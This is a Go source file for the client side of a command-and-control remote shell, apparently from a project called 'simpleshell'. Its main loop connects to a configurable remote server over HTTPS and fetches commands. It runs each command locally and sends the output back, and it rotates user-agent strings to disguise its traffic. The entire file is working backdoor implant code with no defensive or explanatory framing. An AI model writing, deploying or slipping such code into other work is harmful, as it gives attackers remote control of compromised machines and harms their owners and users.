package main

import (
	"flag"

	"github.com/gogetthis/simpleshell/utils"
)

func main() {

	serverPtr := flag.String("server", "localhost:8443", "enter the remote server address [HOST:PORT]")
	agentsListPtr := flag.String("useragents", "useragents.txt", "enter the useragents file")
	certPtr := flag.String("cert", "certs/server.crt", "enter the path to server.crt file")
	keyPtr := flag.String("key", "certs/server.key", "enter the path to server.key file")

	flag.Parse()

	server := utils.C2{
		Address:   *serverPtr,
		Protocol:  "https",
		UserAgent: "goclient",
	}

	for {
		server.RandomUser(*agentsListPtr)

		job := utils.Job{
			Command: server.ReceiveCommand(*certPtr, *keyPtr),
		}

		if job.Command == "exit" {
			return
		}

		if job.Execute() {
			server.SendOutput(job.Output)
		}
	}

}
